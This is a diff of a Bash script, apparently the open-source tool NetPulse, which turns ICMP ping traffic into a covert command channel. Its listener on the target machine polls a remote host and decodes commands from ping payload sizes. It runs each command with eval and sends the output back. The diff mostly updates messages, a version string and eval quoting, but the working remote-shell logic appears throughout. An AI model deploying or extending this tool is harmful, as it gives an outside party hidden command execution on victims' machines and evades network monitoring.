@@ -1,5 +1,7 @@
 #!/bin/bash
 
+version="0.0.1"
+
 # define os valores padrão para as variavéis
 ping_timeout=0.5
 verification=true
@@ -13,9 +15,10 @@ show_help() {
     echo '   | . ` ||  __|  | | |  __/| | | | |     `--. \  __| '
     echo '   | |\  || |___  | | | |   | |_| | |____/\__/ / |___ '
     echo '   \_| \_/\____/  \_/ \_|    \___/\_____/\____/\____/ '
-    echo '                                                      '
-    echo '                                                      '
-    echo ''
+    echo ""
+    echo "   v$version - github.com/thekh40s/netpulse           "
+    echo "                                                      "
+    echo ""
     echo "usage: $0 [options] <host>"
     echo ""
     echo "  -h                  display this help message and exit"
@@ -75,12 +78,14 @@ check_payload() {
 }
 
 listener() {
-    echo "Waiting for the connection to $host..."
-
+    pkt_send=1
     while [ true ]; do
+        echo -n "[*] Waiting for a response from the host ($host)... $pkt_send" $'packets sent\r'
+
         # loop que envia ICMP echo requests até que
         # tenha alguma resposta do host
         payload_len=$(ping -n -W $ping_timeout -c 1 $host 2>/dev/null | grep "bytes from" | cut -d " " -f1)
+        ((pkt_send+=1))
         if check_payload "$payload_len"; then
             # o primeiro pacote enviado pelo host não deve conter
             # um payload.
@@ -91,7 +96,8 @@ listener() {
             # esse valor fica armazenado na variavél $u_bytes
             # e é chamado de bytes insignificantes
             u_bytes=$payload_len
-            echo "Connection established with the host. ($u_bytes insignificant bytes)."
+            echo "[+] Connection established."
+            echo "[-] $u_bytes insignificant bytes in the packets."
             break
         fi
     done
@@ -126,7 +132,7 @@ listener() {
 
                 command=$(echo -n "$command" | cut -d ":" -f2-)
 
-                echo "Command received from $host: $command"
+                echo "[-] Command received from the host ($host): $command"
 
                 # verifica se a verificação checksum está habilitada
                 # e se o valor de checksum recebido pelo host não é um '#'
@@ -134,11 +140,11 @@ listener() {
                     # calcula o hash e compara
                     result=$(echo -n "$command" | sha1sum | cut -d " " -f1)
                     if [ "$result" != "$checksum" ]; then
-                        echo "Checksum (SHA1) failed. [ $result != $checksum ]"
+                        echo "[!] Error occurred during checksum verification! [ $result != $checksum ]"
                         # caso o hash não sejam iguais, a máquina envia
                         # uma mensagem ao host dizendo que houve um erro de
                         # verificação e que o comando não pode ser executado
-                        output="[!] [NetPulse Message] The command cannot be executed because the target-side verification failed!"
+                        output="[NETPULSE MESSAGE] Command cannot be executed because the target-side checksum failed."
                         check_failed=true
                     fi
                 fi
@@ -146,9 +152,9 @@ listener() {
                 # verifica se não houve erros de verificação
                 if [ $check_failed == false ]; then
                     if [ -z $command_timeout ]; then
-                        output=$(eval "$command 2>&1")
+                        output=$(eval "$command" 2>&1)
                     else
-                        output=$(eval "timeout -s 9 $command_timeout $command 2>&1")
+                        output=$(eval "timeout --preserve-status -s 9 $command_timeout $command" 2>&1)
                     fi
                 else
                     check_failed=false
@@ -188,7 +194,7 @@ listener() {
                 command=""
                 output=""
 
-                echo "Output transmission complete."
+                echo "[+] Output transmission complete."
             fi
         fi
 
